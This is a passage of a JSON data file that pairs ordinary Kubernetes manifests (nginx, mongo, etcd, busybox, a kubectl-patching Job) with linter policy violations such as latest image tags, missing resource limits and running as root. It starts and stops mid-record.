    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod3\n  namespace: ns3\n  labels:\n    app: my-label-1\nspec:\n  containers:\n  - name: container1\n    image: sadedil/simpleinfoserver:1.0.0\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "2537",
    "manifest_path": "data/manifests/the_stack_sample/sample_0676.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pluscode-no-priority\nspec:\n  replicas: 15\n  selector:\n    matchLabels:\n      app: pluscode-no-priority\n  template:\n    metadata:\n      labels:\n        app: pluscode-no-priority\n    spec:\n      containers:\n      - name: pluscode-container\n        image: wdenniss/pluscode-demo:latest\n        resources:\n          requests:\n            cpu: 200m\n            memory: 250Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pluscode-container\" is using an invalid container image, \"wdenniss/pluscode-demo:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2538",
    "manifest_path": "data/manifests/the_stack_sample/sample_0676.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pluscode-no-priority\nspec:\n  replicas: 15\n  selector:\n    matchLabels:\n      app: pluscode-no-priority\n  template:\n    metadata:\n      labels:\n        app: pluscode-no-priority\n    spec:\n      containers:\n      - name: pluscode-container\n        image: wdenniss/pluscode-demo:latest\n        resources:\n          requests:\n            cpu: 200m\n            memory: 250Mi\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 15 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2539",
    "manifest_path": "data/manifests/the_stack_sample/sample_0676.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pluscode-no-priority\nspec:\n  replicas: 15\n  selector:\n    matchLabels:\n      app: pluscode-no-priority\n  template:\n    metadata:\n      labels:\n        app: pluscode-no-priority\n    spec:\n      containers:\n      - name: pluscode-container\n        image: wdenniss/pluscode-demo:latest\n        resources:\n          requests:\n            cpu: 200m\n            memory: 250Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pluscode-container\" does not have a read-only root file system"
  },
  {
    "id": "2540",
    "manifest_path": "data/manifests/the_stack_sample/sample_0676.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pluscode-no-priority\nspec:\n  replicas: 15\n  selector:\n    matchLabels:\n      app: pluscode-no-priority\n  template:\n    metadata:\n      labels:\n        app: pluscode-no-priority\n    spec:\n      containers:\n      - name: pluscode-container\n        image: wdenniss/pluscode-demo:latest\n        resources:\n          requests:\n            cpu: 200m\n            memory: 250Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pluscode-container\" is not set to runAsNonRoot"
  },
  {
    "id": "2541",
    "manifest_path": "data/manifests/the_stack_sample/sample_0676.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pluscode-no-priority\nspec:\n  replicas: 15\n  selector:\n    matchLabels:\n      app: pluscode-no-priority\n  template:\n    metadata:\n      labels:\n        app: pluscode-no-priority\n    spec:\n      containers:\n      - name: pluscode-container\n        image: wdenniss/pluscode-demo:latest\n        resources:\n          requests:\n            cpu: 200m\n            memory: 250Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pluscode-container\" has memory limit 0"
  },
  {
    "id": "2542",
    "manifest_path": "data/manifests/the_stack_sample/sample_0679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: istio-vsvc-host\nspec:\n  selector:\n    app: istio-vsvc-host\n  ports:\n  - port: 443\n    protocol: TCP\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:istio-vsvc-host])"
  },
  {
    "id": "2543",
    "manifest_path": "data/manifests/the_stack_sample/sample_0680.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ansible-tower\n  namespace: tower\nspec:\n  selector:\n    matchLabels:\n      app: ansible-tower\n      version: v1\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ansible-tower\n        version: v1\n    spec:\n      containers:\n      - name: tower\n        image: dynatraceacm/ansibletower:3.3.1-1-2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tower\" does not have a read-only root file system"
  },
  {
    "id": "2544",
    "manifest_path": "data/manifests/the_stack_sample/sample_0680.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ansible-tower\n  namespace: tower\nspec:\n  selector:\n    matchLabels:\n      app: ansible-tower\n      version: v1\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ansible-tower\n        version: v1\n    spec:\n      containers:\n      - name: tower\n        image: dynatraceacm/ansibletower:3.3.1-1-2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tower\" is not set to runAsNonRoot"
  },
  {
    "id": "2545",
    "manifest_path": "data/manifests/the_stack_sample/sample_0680.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ansible-tower\n  namespace: tower\nspec:\n  selector:\n    matchLabels:\n      app: ansible-tower\n      version: v1\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ansible-tower\n        version: v1\n    spec:\n      containers:\n      - name: tower\n        image: dynatraceacm/ansibletower:3.3.1-1-2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tower\" has cpu request 0"
  },
  {
    "id": "2546",
    "manifest_path": "data/manifests/the_stack_sample/sample_0680.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ansible-tower\n  namespace: tower\nspec:\n  selector:\n    matchLabels:\n      app: ansible-tower\n      version: v1\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ansible-tower\n        version: v1\n    spec:\n      containers:\n      - name: tower\n        image: dynatraceacm/ansibletower:3.3.1-1-2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tower\" has memory limit 0"
  },
  {
    "id": "2547",
    "manifest_path": "data/manifests/the_stack_sample/sample_0681.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: default\n  name: tide\nspec:\n  selector:\n    app: tide\n  ports:\n  - port: 80\n    targetPort: 8888\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:tide])"
  },
  {
    "id": "2548",
    "manifest_path": "data/manifests/the_stack_sample/sample_0683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etcd\n  namespace: chaos-testing\n  labels:\n    app: etcd\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: etcd\n  template:\n    metadata:\n      labels:\n        app: etcd\n      annotations:\n        admission-webhook.pingcap.com/request: chaosfs-etcd\n    spec:\n      containers:\n      - name: etcd\n        imagePullPolicy: IfNotPresent\n        image: k8s.gcr.io/etcd:3.4.3-0\n        args:\n        - /usr/local/bin/etcd\n        - -name=etcd\n        - -advertise-client-urls=http://0.0.0.0:2379\n        - -initial-advertise-peer-urls=http://0.0.0.0:2380\n        - -listen-client-urls=http://0.0.0.0:2379\n        - -listen-peer-urls=http://0.0.0.0:2380\n        - -initial-cluster=etcd=http://0.0.0.0:2380\n        - --data-dir=/var/run/etcd/default.etcd\n        - -initial-cluster-state=new\n        - -initial-cluster-token=etcd-cluster\n        volumeMounts:\n        - mountPath: /var/run/etcd\n          name: datadir\n      volumes:\n      - emptyDir: {}\n        name: datadir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"etcd\" does not have a read-only root file system"
  },
  {
    "id": "2549",
    "manifest_path": "data/manifests/the_stack_sample/sample_0683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etcd\n  namespace: chaos-testing\n  labels:\n    app: etcd\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: etcd\n  template:\n    metadata:\n      labels:\n        app: etcd\n      annotations:\n        admission-webhook.pingcap.com/request: chaosfs-etcd\n    spec:\n      containers:\n      - name: etcd\n        imagePullPolicy: IfNotPresent\n        image: k8s.gcr.io/etcd:3.4.3-0\n        args:\n        - /usr/local/bin/etcd\n        - -name=etcd\n        - -advertise-client-urls=http://0.0.0.0:2379\n        - -initial-advertise-peer-urls=http://0.0.0.0:2380\n        - -listen-client-urls=http://0.0.0.0:2379\n        - -listen-peer-urls=http://0.0.0.0:2380\n        - -initial-cluster=etcd=http://0.0.0.0:2380\n        - --data-dir=/var/run/etcd/default.etcd\n        - -initial-cluster-state=new\n        - -initial-cluster-token=etcd-cluster\n        volumeMounts:\n        - mountPath: /var/run/etcd\n          name: datadir\n      volumes:\n      - emptyDir: {}\n        name: datadir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"etcd\" is not set to runAsNonRoot"
  },
  {
    "id": "2550",
    "manifest_path": "data/manifests/the_stack_sample/sample_0683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etcd\n  namespace: chaos-testing\n  labels:\n    app: etcd\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: etcd\n  template:\n    metadata:\n      labels:\n        app: etcd\n      annotations:\n        admission-webhook.pingcap.com/request: chaosfs-etcd\n    spec:\n      containers:\n      - name: etcd\n        imagePullPolicy: IfNotPresent\n        image: k8s.gcr.io/etcd:3.4.3-0\n        args:\n        - /usr/local/bin/etcd\n        - -name=etcd\n        - -advertise-client-urls=http://0.0.0.0:2379\n        - -initial-advertise-peer-urls=http://0.0.0.0:2380\n        - -listen-client-urls=http://0.0.0.0:2379\n        - -listen-peer-urls=http://0.0.0.0:2380\n        - -initial-cluster=etcd=http://0.0.0.0:2380\n        - --data-dir=/var/run/etcd/default.etcd\n        - -initial-cluster-state=new\n        - -initial-cluster-token=etcd-cluster\n        volumeMounts:\n        - mountPath: /var/run/etcd\n          name: datadir\n      volumes:\n      - emptyDir: {}\n        name: datadir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"etcd\" has cpu request 0"
  },
  {
    "id": "2551",
    "manifest_path": "data/manifests/the_stack_sample/sample_0683.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: etcd\n  namespace: chaos-testing\n  labels:\n    app: etcd\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: etcd\n  template:\n    metadata:\n      labels:\n        app: etcd\n      annotations:\n        admission-webhook.pingcap.com/request: chaosfs-etcd\n    spec:\n      containers:\n      - name: etcd\n        imagePullPolicy: IfNotPresent\n        image: k8s.gcr.io/etcd:3.4.3-0\n        args:\n        - /usr/local/bin/etcd\n        - -name=etcd\n        - -advertise-client-urls=http://0.0.0.0:2379\n        - -initial-advertise-peer-urls=http://0.0.0.0:2380\n        - -listen-client-urls=http://0.0.0.0:2379\n        - -listen-peer-urls=http://0.0.0.0:2380\n        - -initial-cluster=etcd=http://0.0.0.0:2380\n        - --data-dir=/var/run/etcd/default.etcd\n        - -initial-cluster-state=new\n        - -initial-cluster-token=etcd-cluster\n        volumeMounts:\n        - mountPath: /var/run/etcd\n          name: datadir\n      volumes:\n      - emptyDir: {}\n        name: datadir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"etcd\" has memory limit 0"
  },
  {
    "id": "2552",
    "manifest_path": "data/manifests/the_stack_sample/sample_0684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vdbench-sv4-svc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: vdbench-sv4-svc\n  template:\n    metadata:\n      labels:\n        app: vdbench-sv4-svc\n    spec:\n      containers:\n      - name: vdbench\n        image: portworx/vdbench:torpedo\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 500Mi\n          requests:\n            memory: 256Mi\n            cpu: 100m\n        command:\n        - ./bench_runner.sh\n        args:\n        - Basic\n        - '5400'\n        - $(POD_NAME)\n        - output/$(POD_NAME)\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: vdbench-persistent-storage-enc\n          mountPath: /tmp\n        - name: vdbench-output-persistent-storage\n          mountPath: /output\n      volumes:\n      - name: vdbench-persistent-storage-enc\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-enc-sv4-svc\n      - name: vdbench-output-persistent-storage\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-output-sv4-svc\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2553",
    "manifest_path": "data/manifests/the_stack_sample/sample_0684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vdbench-sv4-svc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: vdbench-sv4-svc\n  template:\n    metadata:\n      labels:\n        app: vdbench-sv4-svc\n    spec:\n      containers:\n      - name: vdbench\n        image: portworx/vdbench:torpedo\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 500Mi\n          requests:\n            memory: 256Mi\n            cpu: 100m\n        command:\n        - ./bench_runner.sh\n        args:\n        - Basic\n        - '5400'\n        - $(POD_NAME)\n        - output/$(POD_NAME)\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: vdbench-persistent-storage-enc\n          mountPath: /tmp\n        - name: vdbench-output-persistent-storage\n          mountPath: /output\n      volumes:\n      - name: vdbench-persistent-storage-enc\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-enc-sv4-svc\n      - name: vdbench-output-persistent-storage\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-output-sv4-svc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vdbench\" does not have a read-only root file system"
  },
  {
    "id": "2554",
    "manifest_path": "data/manifests/the_stack_sample/sample_0684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vdbench-sv4-svc\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: vdbench-sv4-svc\n  template:\n    metadata:\n      labels:\n        app: vdbench-sv4-svc\n    spec:\n      containers:\n      - name: vdbench\n        image: portworx/vdbench:torpedo\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 500Mi\n          requests:\n            memory: 256Mi\n            cpu: 100m\n        command:\n        - ./bench_runner.sh\n        args:\n        - Basic\n        - '5400'\n        - $(POD_NAME)\n        - output/$(POD_NAME)\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: vdbench-persistent-storage-enc\n          mountPath: /tmp\n        - name: vdbench-output-persistent-storage\n          mountPath: /output\n      volumes:\n      - name: vdbench-persistent-storage-enc\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-enc-sv4-svc\n      - name: vdbench-output-persistent-storage\n        persistentVolumeClaim:\n          claimName: vdbench-pvc-output-sv4-svc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vdbench\" is not set to runAsNonRoot"
  },
  {
    "id": "2555",
    "manifest_path": "data/manifests/the_stack_sample/sample_0685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      name: mongo-pod\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2556",
    "manifest_path": "data/manifests/the_stack_sample/sample_0685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      name: mongo-pod\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "2557",
    "manifest_path": "data/manifests/the_stack_sample/sample_0685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      name: mongo-pod\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "2558",
    "manifest_path": "data/manifests/the_stack_sample/sample_0685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      name: mongo-pod\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "2559",
    "manifest_path": "data/manifests/the_stack_sample/sample_0685.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      name: mongo-pod\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - image: mongo\n        name: mongo\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "2560",
    "manifest_path": "data/manifests/the_stack_sample/sample_0686.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    foo: bar\n  name: my-nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:1.14.2\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2561",
    "manifest_path": "data/manifests/the_stack_sample/sample_0686.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    foo: bar\n  name: my-nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:1.14.2\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2562",
    "manifest_path": "data/manifests/the_stack_sample/sample_0686.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    foo: bar\n  name: my-nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:1.14.2\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2563",
    "manifest_path": "data/manifests/the_stack_sample/sample_0686.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    foo: bar\n  name: my-nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:1.14.2\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2564",
    "manifest_path": "data/manifests/the_stack_sample/sample_0686.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    foo: bar\n  name: my-nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx:1.14.2\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2565",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2566",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2567",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "2568",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "2569",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "2570",
    "manifest_path": "data/manifests/the_stack_sample/sample_0687.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nfs-busybox\n  namespace: mybox\nspec:\n  replicas: 2\n  selector:\n    name: nfs-busybox\n  template:\n    metadata:\n      labels:\n        name: nfs-busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sh\n        - -c\n        - while true; do date > /mnt/index.html; hostname >> /mnt/index.html; sleep\n          $(($RANDOM % 5 + 5)); done\n        imagePullPolicy: IfNotPresent\n        name: busybox\n        volumeMounts:\n        - name: nfs\n          mountPath: /mnt\n      volumes:\n      - name: nfs\n        persistentVolumeClaim:\n          claimName: nfs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "2571",
    "manifest_path": "data/manifests/the_stack_sample/sample_0689.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: s3g-public\nspec:\n  ports:\n  - port: 9878\n    name: rest\n  selector:\n    app: ozone\n    component: s3g\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ozone component:s3g])"
  },
  {
    "id": "2572",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          \\      \\\"uid\\\": \\\"$UUID\\\"\\n      }\\n    ]\\n  }\\n}\\nEOF\\n)\\necho $JSON\\n\\\n          kubectl patch MutatingWebhookConfiguration $HOOK_NAME -n cloudflow -p \\\"\\\n          $JSON\\\"\"\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2573",
    "manifest_path": "data/manifests/the_stack_sample/sample_0690.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cloudflow-patch-spark-mutatingwebhookconfig\nspec:\n  template:\n    spec:\n      serviceAccountName: cloudflow-operator\n      containers:\n      - name: main\n        image: alpine:3.12\n        command:\n        - /bin/ash\n        - -c\n        - \"apk update && apk add wget\\nwget -q -O /bin/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.16.12/bin/linux/amd64/kubectl\\\n          \\ && chmod 755 /bin/kubectl\\nNAME=\\\"spark-operator-sparkoperator\\\"\\nAPI_VERSION=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.apiVersion}')\\nUUID=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.metadata.uid}')\\nKIND=$(kubectl\\\n          \\ get deployment -n cloudflow $NAME -o jsonpath='{.kind}')\\nHOOK_NAME=\\\"\\\n          spark-operator-sparkoperator-webhook-config\\\"\\nJSON=$(cat <<EOF\\n{\\n  \\\"\\\n          metadata\\\": {\\n    \\\"ownerReferences\\\": [\\n      {\\n        \\\"apiVersion\\\"\\\n          : \\\"$API_VERSION\\\",\\n        \\\"blockOwnerDeletion\\\": true,\\n        \\\"controller\\\"\\\n          : true,\\n        \\\"kind\\\": \\\"$KIND\\\",\\n        \\\"name\\\": \\\"$NAME\\\",\\n  \\\n          